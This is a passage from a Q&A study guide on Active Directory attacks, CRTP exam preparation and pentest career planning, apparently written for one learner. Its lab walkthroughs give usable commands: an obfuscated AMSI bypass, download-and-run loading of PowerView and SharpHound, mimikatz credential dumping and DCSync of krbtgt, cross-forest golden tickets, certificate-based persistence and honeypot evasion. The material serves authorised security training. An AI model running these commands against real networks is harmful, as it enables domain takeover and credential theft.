- Advanced evasion
- Process injection
- AV/EDR bypass
- AppLocker bypass
- AD attacks
- C2 framework usage

**Best for:**
- Red team specialization
- Evasion expertise

**Recommendation for your path:**

You already have CRTP planning. Suggested order:

1. **CRTP** (in progress) - Foundation
2. **OSCP** - Broader skills, well-recognized
3. **CRTE** - Specialize in AD
4. **OSEP** - Red team evasion
5. **CRTM** - Mastery (if budget allows)
6. **CARTP** - Azure focus

**Skip:** CRTM is expensive and not always needed. OSEP usually more practical.

**For India hiring market:**

OSCP most recognized. CRTP excellent supplement showing AD specialty.

### Q83: AD attack methodology for engagements
**A:**

**Structured methodology for professional engagements:**

**Phase 0: Pre-engagement**

- Scope definition
- Rules of engagement
- Communication plan
- Emergency contacts
- Stop conditions

**Phase 1: Reconnaissance (Day 1)**

External:
- Subdomain enumeration
- Employee enumeration (LinkedIn, Hunter.io)
- Technology stack
- Email patterns

Internal (after access):
- Network ranges
- Domain controllers
- High-value targets
- Sensitive services

**Phase 2: Initial Access (Day 1-2)**

Methods (test multiple):
- Phishing campaigns
- Password sprays
- Public exploits
- Physical access
- Social engineering

Document:
- What worked
- What was blocked
- User awareness

**Phase 3: Foothold Hardening (Day 2)**

- Confirm access
- Establish secondary access
- Setup C2
- Avoid losing access

**Phase 4: Discovery (Day 2-3)**

- BloodHound collection
- AD enumeration
- Find sensitive shares
- Map attack surface
- Identify trust relationships

**Phase 5: Privilege Escalation (Day 3-5)**

- Local privesc on initial host
- Credential collection
- Lateral movement
- Domain privesc paths

**Phase 6: Lateral Movement (Day 4-7)**

- Move through tiers
- Avoid Tier 0 too early
- Multiple paths
- Mapping environment

**Phase 7: Domain Compromise (Day 5-7)**

- Get Domain Admin
- DCSync
- Establish multiple persistence
- Document attack path

**Phase 8: Goal Achievement (Day 7-9)**

Depending on engagement goals:
- Access sensitive data
- Demonstrate ransomware potential
- Access specific systems
- Bypass specific controls

**Phase 9: Detection Testing (Day 9-10)**

- Test if defenders detected
- What worked at evasion
- What should have been detected

**Phase 10: Reporting (Day 10-14)**

- Detailed findings
- Executive summary
- Remediation roadmap
- Presentation prep

**Engagement length:**

- Quick assessment: 1 week
- Standard pentest: 2 weeks
- Red team: 4-12 weeks
- Persistent emulation: Ongoing

**For your career:**

After CRTP, you'll have skills for real engagements. Pentest consulting often pays $500-2000/day for AD pentesters in India, $1500-3000/day internationally.

### Q84: Working as AD security specialist
**A:**

**Career paths in AD security:**

**1. Penetration Tester (Offensive):**

- Conduct pentests with AD focus
- Report findings
- Recommend fixes
- Salary: ₹10-30 LPA junior, ₹30-80 LPA senior

**2. Red Team Operator:**

- Long-term engagements
- Evasion focus
- Custom tooling
- Salary: ₹25-80 LPA in India, $150-300K USD international

**3. AD Security Architect:**

- Design secure AD environments
- Migration planning
- Hardening strategies
- Salary: ₹30-100 LPA

**4. Incident Responder (DFIR):**

- Respond to AD breaches
- Forensics
- Recovery planning
- Salary: ₹15-60 LPA

**5. Detection Engineer:**

- Build AD detection rules
- SIEM development
- Threat hunting
- Salary: ₹20-70 LPA

**6. Consultant:**

- Independent or firm
- AD assessments
- Hardening engagements
- Hourly: $100-500 USD

**7. Trainer/Educator:**

- This is Encrypticle's path
- Build courses
- Conference speaking
- Variable income: ₹10-100 LPA+

**8. Researcher:**

- Find new techniques
- Publish research
- Often at security companies
- Salary: ₹30-150 LPA

**Day-to-day for AD pentester:**

Morning:
- Review engagement status
- Plan day's activities
- Team standup

Mid-day:
- Active testing
- Documentation
- Tool development
- Lab work

End of day:
- Update findings
- Communication with client
- Tomorrow's planning

**Skills beyond technical:**

1. **Communication** - Explain to executives
2. **Writing** - Clear reports
3. **Project management** - Stay on schedule
4. **Stakeholder management** - Clients trust you
5. **Continuous learning** - Field evolves rapidly
6. **Ethics** - Reputation matters

**For your specific path:**

Combining:
- Bug bounty (PepsiCo HoF, etc.)
- CRTP (AD specialization)
- Encrypticle (training brand)
- Indian market knowledge

Unique positioning:
- Bug bounty hunter who specializes in enterprise AD
- Indian-language educator (Hinglish)
- Bridge between offensive and defensive
- Practical experience demonstrable

This combination is rare and valuable. Build on it.

### Q85: Common career mistakes to avoid
**A:**

**Pitfalls in AD security career:**

**1. Cert collection without practice:**

Having OSCP, CRTP, CRTE, CISSP, CEH but never finding real bugs.

Fix: Bug bounty, CTFs, write blog posts, demonstrate skills.

**2. Tool reliance without understanding:**

Running Mimikatz without knowing how Kerberos works.

Fix: Understand the protocols. Read RFCs.

**3. Avoiding defensive knowledge:**

Pure offensive without understanding defense.

Fix: Learn blue team perspective. Makes you more valuable.

**4. No public presence:**

Skilled but invisible.

Fix: Write blog posts, present at conferences, contribute to open source.

**5. Burnout:**

Always grinding without rest.

Fix: Sustainable pace. Hobbies outside security.

**6. Ethical lapses:**

Using skills against unauthorized targets.

Fix: Always have written authorization. Even for "harmless" tests.

**7. Not networking:**

Skills but no connections.

Fix: Discord/Twitter community. Conferences. Reach out to people.

**8. Imposter syndrome:**

Skilled but feeling inadequate.

Fix: Remember everyone started somewhere. Focus on continuous learning.

**9. Avoiding new areas:**

Sticking to comfortable techniques.

Fix: Constantly learn. Cloud, mobile, hardware, web - all useful.

**10. Bad communication:**

Brilliant findings, terrible reports.

Fix: Practice writing. Clear > complex.

**11. Job hopping too much:**

Every year switching for 10% raise.

Fix: 2-3 years per role minimum (in India, faster acceptable). Build deep experience.

**12. Negotiating poorly:**

Accepting first offer.

Fix: Know your worth. Research salaries. Negotiate.

**13. No specialization:**

Generalist forever.

Fix: Pick 1-2 specialties (AD security is yours). Deep expertise pays better.

**14. Avoiding leadership:**

Hands-on forever.

Fix: At some point, manage/mentor others. Maximum impact requires this.

**15. Health neglect:**

Burning the candle at both ends.

Fix: Sleep, exercise, eat well. Long-term career.

**For your path:**

You're already avoiding many of these:
- ✅ Practical bug bounty experience
- ✅ Building public presence (Encrypticle)
- ✅ Multiple specialties (web + AD)
- ✅ Educator role

Continue focus on:
- Health (lean muscle gain plan)
- Community building
- Long-term thinking
- Quality over quantity

### Q86-95: Real attack scenarios with full details
**A:**

**Scenario 86: Compromise from phishing to DA in 4 hours**

Initial access: Phishing email with malicious doc (HTA file)
1. User opens document
2. HTA file launches PowerShell
3. PowerShell loads C2 implant in memory
4. C2 beacon to attacker

Local privesc:
1. Run SharpUp / WinPEAS
2. Find unquoted service path
3. Drop binary in path
4. Restart service → SYSTEM

Domain recon:
1. SharpHound collection
2. BloodHound analysis
3. Find: User has GenericWrite on critical group
4. Path: 3 hops to DA

Execution:
1. Add user to Domain Admins via group write
2. Wait for SDProp NOT to revert (60 min)
3. RDP to DC as new DA
4. DCSync KRBTGT
5. Golden Ticket for persistence

Time: 4 hours total.

**Scenario 87: SCCM abuse path**

Initial access: Compromised low-priv user

SCCM (System Center Configuration Manager) commonly deployed:
1. Network: Find SCCM site server
2. Site server has high privileges (admin on all clients)
3. SCCM Network Access Account: Often domain account with creds in SCCM database

Attack:
1. Compromise SCCM client
2. Get to SCCM data
3. Extract NAA credentials
4. NAA often has admin rights → lateral movement

Tool: SharpSCCM

```
.\SharpSCCM.exe local credentials
.\SharpSCCM.exe local secrets
```

**Scenario 88: Exchange exploitation**

Exchange servers have extensive AD rights:

1. Compromise Exchange via ProxyShell/ProxyNotShell
2. Exchange machine account has WriteDACL on domain
3. Use machine account to grant DCSync rights to your user
4. DCSync

CVE-2021-34473, CVE-2021-34523, CVE-2021-31207 (ProxyShell)

**Scenario 89: ADCS persistence via certificate**

1. Get Domain Admin temporarily
2. Request user certificate as Administrator (using ESC1 template or as DA)
3. Certificate valid for 1-2 years typically
4. Even if Administrator password reset, certificate still works
5. Use Rubeus + cert for TGT anytime

```
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:CertPass
```

Stealthy long-term persistence.

**Scenario 90: WSUS abuse**

WSUS (Windows Server Update Services) often poorly secured:

1. Find WSUS server
2. Check if HTTP (not HTTPS)
3. WSUSPendu / similar tools
4. Inject malicious "update"
5. All WSUS clients install it
6. Code execution as SYSTEM domain-wide

**Scenario 91: Hidden admin via ProtectedFromAccidentalDeletion**

Persistence technique:

1. Create admin account
2. Set ProtectedFromAccidentalDeletion flag
3. Hide from normal queries
4. Account harder to delete (alerts admins)

**Scenario 92: ForeignSecurityPrincipal**

Cross-forest attacks:

1. Find foreign principals in groups
2. ForeignSecurityPrincipal objects in CN=ForeignSecurityPrincipals,DC=corp,DC=local
3. Map to SIDs in other forests
4. Identify cross-forest privileges

**Scenario 93: GPP password decryption deep dive**

Beyond cPassword in Groups.xml, check:
- Services.xml
- ScheduledTasks.xml
- DataSources.xml
- Drives.xml
- Printers.xml

All can contain cPassword.

```powershell
# Search all SYSVOL
Get-ChildItem -Path \\corp.local\SYSVOL -Filter *.xml -Recurse | 
    Select-String -Pattern "cpassword="
```

**Scenario 94: Kerberos delegation across trusts**

If trust allows delegation:
1. Compromise account with delegation rights
2. S4U to service in trusted domain
3. Access cross-trust resources as any user

Most environments block this, but check.

**Scenario 95: Honey pot evasion**

Defenders deploy honey users:
- "admin_test" with password "Password123"
- SPNs with weak passwords
- Shares with canary tokens

Detection signs:
- Account never logged in
- Recent creation date
- Default description
- In unusual OU

Verify before exploiting.

### Q96: Specific report structure for CRTP
**A:**

**CRTP exam report structure:**

```markdown
# CRTP Exam Report
## [Your Name] | Date

## Table of Contents

1. Executive Summary
2. Attack Path Diagram
3. Compromise Detail Per Machine
4. Tools Used
5. Recommendations
6. References

---

## 1. Executive Summary

During the 24-hour CRTP examination, all 5 target machines 
were compromised, achieving Domain Admin on the parent domain 
and Enterprise Admin status across the forest.

Key findings:
- Multiple Kerberoasting opportunities with weak passwords
- ACL misconfigurations enabling privilege escalation
- Unconstrained delegation on critical servers
- Cross-forest trust abuse for forest-level compromise

## 2. Attack Path Diagram

[Visual diagram showing path through machines]

User: studentadmin@studentauditor.us.techcorp.local
  ↓ Local PrivEsc
SYSTEM on STUDENTAUDITOR
  ↓ Kerberoast
svc_app credentials
  ↓ Lateral Movement
STUDENT-WINMGR (Local Admin)
  ↓ ACL Abuse
Domain Admin: us.techcorp.local
  ↓ DCSync
KRBTGT Hash
  ↓ Golden Ticket + SID History
Enterprise Admin: techcorp.local

## 3. Compromise Detail Per Machine

### Machine 1: STUDENTAUDITOR.us.techcorp.local

**Initial Access:**
SSH access provided as studentadmin user.

**Privilege Escalation:**
[Detailed steps with screenshots]

**Credentials Obtained:**
- svc_app: cracked from Kerberoasting (weak password)

[Screenshots of each step]

### Machine 2: STUDENT-WINMGR.us.techcorp.local

[Similar structure]

### Machine 3: STUDENT-LINUX.us.techcorp.local

[Similar structure]

### Machine 4: DC.us.techcorp.local

**Privilege Escalation:**
Through ACL abuse, gained Domain Admin

[Screenshots showing DCSync]

### Machine 5: DC.techcorp.local (Parent Forest)

**Cross-Forest Compromise:**
Using SID History injection from us.techcorp.local
Created Golden Ticket with parent EA SID
Verified Enterprise Admin access

[Screenshots]

## 4. Tools Used

### Enumeration:
- PowerView (loaded via reflection)
- AD Module
- SharpHound + BloodHound
- adsearch.exe

### Exploitation:
- Mimikatz (for credential dumping and ticket manipulation)
- Rubeus (Kerberos attacks)
- SharpHound (data collection)
- Invoke-PowerShellTcp (initial access)

### Lateral Movement:
- WinRM (PSRemoting)
- Schtasks for SYSTEM execution
- WMIExec equivalent in PowerShell

## 5. Recommendations

### Immediate Actions (24-48 hours):

1. **Reset KRBTGT password twice**
   - Use Microsoft's reset script
   - Wait between rotations for replication

2. **Reset all service account passwords**
   - Especially Kerberoastable accounts
   - Use 25+ character random passwords

3. **Remove unconstrained delegation**
   - From SERVER1 and similar non-DC machines
   - Replace with constrained or RBCD if needed

### Short-term (1-4 weeks):

1. **Implement LAPS** for local admin password management
2. **Audit AD ACLs** with BloodHound
3. **Enable PowerShell logging** comprehensively
4. **Deploy Microsoft Defender for Identity**
5. **Disable RC4 encryption** domain-wide

### Long-term (1-3 months):

1. **Implement tier model**
2. **Deploy Privileged Access Workstations**
3. **Configure conditional access**
4. **Establish privileged access management**
5. **Regular AD security assessments (quarterly)**

## 6. References

- Microsoft AD Security Guide
- ATT&CK Framework
- BloodHound Documentation
- CRTP Course Materials
- [Tool references]
```

**Report quality matters:**

- Spell check thoroughly
- Screenshots clear and labeled
- Logical flow
- Professional tone
- Pass rate higher with quality reports

### Q97: Specific lab walkthrough patterns
**A:**

**CRTP-style lab walkthrough template:**

**Starting position:** SSH or RDP to first machine as standard user

**Step 1: Initial enumeration**

```powershell
# Identity
whoami /all

# System info
systeminfo
ipconfig /all
hostname

# Privilege check
whoami /priv

# Network
arp -a
netstat -ano
```

**Step 2: Local privilege escalation**

Common techniques:
1. AppLocker bypass
2. Service binary hijack
3. Unquoted service paths
4. Token impersonation (Potato)
5. Kernel exploits

```powershell
# WinPEAS (if not blocked)
.\winpeas.exe systeminfo userinfo procesinfo servicesinfo applicationsinfo

# Or PowerUp
. .\PowerUp.ps1
Invoke-AllChecks
```

**Step 3: AMSI bypass and tool loading**

```powershell
# Bypass AMSI
S`eT-It`em ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZ'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  )  ) ; (  Get-varI`A`BLE  ( '1Q2U'+'Z'  )  -VaL  ).'A`ss`Embly'.'GET`TY`Pe'((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).'g`etf`iElD'(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' )).'sE`T`VaLUE'(  ${n`ULl},${t`RuE} )

# Load PowerView
IEX (New-Object Net.WebClient).DownloadString("http://server/PowerView.ps1")
```

**Step 4: Domain enumeration**

```powershell
# Basic info
Get-Domain
Get-DomainController

# Users with SPNs
Get-DomainUser -SPN

# AS-REP roastable
Get-DomainUser -PreauthNotRequired

# Unconstrained delegation
Get-DomainComputer -Unconstrained

# High-value targets
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Enterprise Admins"

# ACL analysis
Find-InterestingDomainAcl -ResolveGUIDs
```

**Step 5: BloodHound**

```powershell
# Drop and run SharpHound
$wc = New-Object Net.WebClient
$wc.DownloadFile("http://server/SharpHound.exe", "C:\Users\Public\sh.exe")
C:\Users\Public\sh.exe -CollectionMethod All

# Move zip to local for BloodHound import
```

Analyze in BloodHound:
- Mark current user as Owned
- Find shortest path to Domain Admins
- Identify quick wins

**Step 6: Execute attack chain**

Common quick wins:
1. Kerberoast service account → crack → use credentials
2. Find admin password reused on multiple machines
3. ACL abuse via discovered relationship
4. GPP password in SYSVOL

**Step 7: Privilege escalation to DA**

```powershell
# After accumulating credentials and access
# Use mimikatz for credential extraction
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Or DCSync if rights obtained
lsadump::dcsync /user:krbtgt /domain:corp.local
```

**Step 8: Forest privilege escalation**

```powershell
# Get child KRBTGT
lsadump::dcsync /user:krbtgt /domain:child.parent.local

# Get parent SID
Get-DomainSID -Domain parent.local

# Create cross-forest Golden Ticket
kerberos::golden /user:Administrator /domain:child.parent.local /sid:CHILD_SID /sids:PARENT_SID-519 /krbtgt:HASH /ticket:gold.kirbi

# Use it
kerberos::ptt gold.kirbi
dir \\dc.parent.local\C$
```

**Step 9: Documentation**

Screenshots for each step. Record:
- Commands run
- Output
- Credentials obtained
- Path taken

**Tips:**

1. Take screenshots immediately - don't wait
2. Save credentials in single file (encrypted)
3. Don't lose access - have backup methods
4. Sleep when tired (12-hour mark)
5. Report writing takes time - leave 48h after lab

### Q98: Building deeper expertise after CRTP
**A:**

**Post-CRTP learning path:**

**Year 1: Solidify foundations**

1. **HackTheBox Pro Labs:**
   - Dante (general)
   - Cybernetics (AD-focused)
   - Offshore
   - RastaLabs
   - APTLabs

2. **Custom labs:**
   - Build complex AD environments
   - Practice advanced attacks
   - Test detection bypasses

3. **OSCP:**
   - Broader pentest skills
   - Industry recognition
   - Often required for jobs

4. **Real bug bounty:**
   - AD-using companies
   - Microsoft Bounty Program
   - GitHub Bug Bounty (uses AD internally)

**Year 2: Specialization**

1. **CRTE:**
   - Advanced AD
   - ADCS attacks
   - SQL Server abuse
   - Evasion

2. **PowerShell mastery:**
   - Custom tools
   - C# integration
   - Reflection techniques

3. **C# development:**
   - .NET reflection
   - In-memory loading
   - Custom Mimikatz mods

4. **Active red team engagements:**
   - Join red team consultancy
   - Real-world experience

**Year 3: Advanced expertise**

1. **OSEP:**
   - Evasion focus
   - Custom payloads
   - AMSI/EDR bypass

2. **Custom tool development:**
   - C2 framework usage
   - Custom payloads
   - Maldoc development

3. **Conference talks:**
   - DEF CON
   - Black Hat
   - BSides
   - Local meetups

4. **Open source contributions:**
   - Existing tools
   - Custom additions
   - Bug reports

**Year 4+: Recognition**

1. **Original research:**
   - Find new techniques
   - Publish at conferences
   - Whitepapers

2. **Industry recognition:**
   - Awards
   - Speaking circuit
   - Recognized expert

3. **Senior consulting:**
   - High day rates
   - Selective engagements
   - Thought leadership

**Resources to follow:**

Twitter accounts:
- @harmj0y (Will Schroeder - PowerView creator)
- @cobbr_io (Ryan Cobb)
- @gentilkiwi (Mimikatz)
- @SpecterOps (BloodHound)
- @rookuu_ (ADCS attacks)
- @PyroTek3 (AD security blog)

Blogs:
- adsecurity.org (Sean Metcalf)
- specterops.io (BloodHound team)
- harmj0y.net (PowerView)
- dirkjanm.io
- @offsec papers

YouTube:
- IppSec
- John Hammond
- Marcus Hutchins
- HackTricks

Books:
- "Active Directory Security" series (Sean Metcalf)
- "Tribe of Hackers Red Team"
- "Hands-on Hacking"

**For your specific path:**

After CRTP:
1. **OSCP** in 6 months (you have foundation)
2. **CRTE** in 6-12 months
3. **Build Encrypticle content** parallel
4. **Bug bounty on AD-heavy companies** ongoing
5. **CRTM or CARTP** in year 2-3

Unique value proposition: Indian content creator + AD specialist + bug bounty hunter. Few people have this combination.

### Q99: Critical mistakes during exam to avoid
**A:**

**Common exam mistakes:**

**1. Not enumerating thoroughly enough:**

Symptom: Stuck early, missing easy paths.

Fix: First 2-3 hours = pure enumeration. Build complete map.

**2. Tool AV/AMSI blocked:**

Symptom: PowerView blocked, can't run common tools.

Fix: 
- AMSI bypass first
- Have alternatives ready (AD Module)
- Use compiled tools

**3. Not using BloodHound:**

Symptom: Manually trying paths, missing obvious wins.

Fix: SharpHound collection in first hour. Analyze.

**4. No screenshots:**

Symptom: Report writing impossible, can't remember details.

Fix: Screenshot EVERY successful step. Use Snipping Tool.

**5. Lost credentials:**

Symptom: Crack passwords but forget to save.

Fix: Single text file with all credentials, updated as you go.

**6. Not testing access:**

Symptom: Assume you have access, can't verify in report.

Fix: After getting credentials, login and run `whoami`, screenshot.

**7. Going too fast:**

Symptom: Skip steps, miss obvious vulnerabilities.

Fix: Methodical approach. Document as you go.

**8. Going too slow:**

Symptom: Stuck on one technique for hours.

Fix: 1 hour limit per technique. Try another path.

**9. Not sleeping:**

Symptom: Tired, making errors at hour 16.

Fix: Sleep 6 hours at the 12-hour mark.

**10. Bad notes:**

Symptom: Report writing nightmare.

Fix: Clear notes during exam:
```
Time: 14:23
Machine: STUDENT-WINMGR
Step: Got local admin via Potato
Command: .\PrintSpoofer.exe -i -c cmd
Output: Got SYSTEM shell
Next: Run mimikatz
```

**11. Ignoring report:**

Symptom: Lab done but report fails.

Fix: 48-hour report window. Use it. Quality matters.

**12. Cross-forest neglect:**

Symptom: DA but no EA, fail to meet objectives.

Fix: Check trust relationships early. Plan for cross-forest.

**13. AMSI bypass after detection:**

Symptom: Use detection-triggering bypass.

Fix: Multiple bypass methods, try newest first.

**14. Network connectivity issues:**

Symptom: VPN drops, lose progress.

Fix: Stable connection. Have backup internet.

**15. Tool version mismatch:**

Symptom: Old PowerView doesn't have function.

Fix: Have latest dev branch downloaded before exam.

**16. Wrong methodology:**

Symptom: Random attacks without strategy.

Fix: Methodology: Enum → BloodHound → Plan → Execute → Verify

**17. Not reading scenario:**

Symptom: Miss given hints in scenario document.

Fix: Read all materials carefully.

**18. Tunneling on report only:**

Symptom: Find vulns but report poorly written.

Fix: Write while you exploit. Don't leave entirely for after.

**For CRTP specifically:**

The lab is realistic enterprise. Treat like real engagement:
- Methodical
- Documented
- Verified
- Multiple paths
- Cross-forest covered

### Q100: Final advice and motivation
**A:**

**The journey of AD security mastery:**

**Where you are now (Jagdeep):**

- CRTP in progress (foundation building)
- Bug bounty experience (PepsiCo HoF, JBL, snapdeploy.dev)
- Encrypticle brand building (educator path)
- ~2 years offensive security
- Strong technical foundation

**The next 5 years (potential path):**

**Year 1:**
- Complete CRTP
- OSCP
- Build Encrypticle to 10K subscribers
- Bug bounty: ₹5-15 LPA from bounties
- First senior pentest role: ₹15-25 LPA

**Year 2:**
- CRTE
- Multiple Hall of Fames
- Encrypticle: 25K+ subscribers
- Bug bounty: ₹15-30 LPA
- Senior pentest: ₹25-40 LPA total

**Year 3:**
- OSEP / CARTP
- Conference speaker
- Encrypticle: paid courses generating ₹50K+/month
- Bug bounty: ₹30-60 LPA top quartile
- Lead pentester or own consultancy

**Year 4-5:**
- Recognized expert in Indian AD security
- 100K+ Encrypticle subscribers
- ₹1Cr+ annual from combined sources
- International speaking
- Influence in industry

**Key principles:**

**1. Compound your advantages:**

You have unique combination - leverage it:
- Bug bounty visibility
- Indian-language content
- Technical depth
- Educator presence

**2. Build community:**

Helping others builds your reputation. Encrypticle is right path.

**3. Stay curious:**

AD attacks evolving. Stay current. Read research. Test new techniques.

**4. Take care of yourself:**

Your weight gain plan, guitar, reading - keep them. Burnout kills careers.

**5. Document everything:**

Blog posts, video content, case studies. Your future self will thank you.

**6. Help others:**

Mentoring grows you faster. Cohort V2 helps students AND your skills.

**7. Be patient:**

Mastery takes 5-10 years. Don't rush. Build foundations properly.

**8. Stay ethical:**

Every action affects your reputation. One unethical act can destroy years of work.

**9. Connect across countries:**

International market pays better. Your skills are globally relevant.

**10. Enjoy the journey:**

You're learning fascinating stuff. Adversaries are clever. Defense is intellectual. Make it fun.

**Specific advice for you:**

1. **Cohort V2 success will define next year** - Make it excellent
2. **CRTP exam mid-year** - Treat as priority
3. **Continue bug bounty** - Maintains skills + income
4. **Build OSCP prep parallel to CRTP** - Time is finite
5. **Document on Encrypticle** as you learn - Content multiplies value
6. **Hindi/Hinglish content** is your moat - Few competitors
7. **Indian fintech is huge** - Specialize there with Zorvyn experience
8. **Keep guitar and reading** - Mental health matters
9. **Connect with peers globally** - Twitter, Discord communities
10. **Long-term thinking** - 10 years from now you can be world-class expert

**Final words:**

Active Directory security is one of the most impactful specialties in cybersecurity. Compromising AD = compromising the entire enterprise. The knowledge is deep, technical, and continuously evolving.

You're well-positioned with strong foundation, practical experience, and clear direction. The path ahead requires consistency, patience, and continuous learning.

The Encrypticle audience you're building will help thousands of Indian students enter this field properly. That impact is significant beyond personal financial gains.

Stay focused. Stay curious. Stay ethical. Stay healthy.

The Indian cybersecurity ecosystem is growing rapidly, and specialists like you - bridging offensive expertise, educator presence, and bug bounty success - are exactly what's needed.

Best of luck with CRTP exam, Cohort V2 launch on July 5th, and the journey ahead.

You've got this.

---

## END OF PART 14 - AD/CRTP (100 Q&A COMPLETE)

**Coverage Summary:**
- Section A: AD Fundamentals (Q1-30)
- Section B: Attack Techniques (Q31-65)
- Section C: Advanced & Exam Prep (Q66-100)

**Topics covered comprehensively:**
- Kerberos and NTLM authentication
- Kerberoasting, AS-REP roasting
- Pass-the-Hash, Pass-the-Ticket
- Golden/Silver/Diamond tickets
- DCSync, DCShadow
- Unconstrained/Constrained/RBCD delegation
- ACL abuse paths
- ADCS attacks (ESC1-8)
- BloodHound and SharpHound
- PowerView and AD Module
- Mimikatz comprehensive
- Rubeus comprehensive
- GPO abuse
- Trust attacks and cross-forest
- Persistence (multiple methods)
- Detection and defense
- Real-world scenarios
- CRTP exam strategy and tips
- Career progression and advice

**Combined with Part 14 first half (Q1-54), this provides complete coverage for interview prep on Active Directory and CRTP-related topics.**

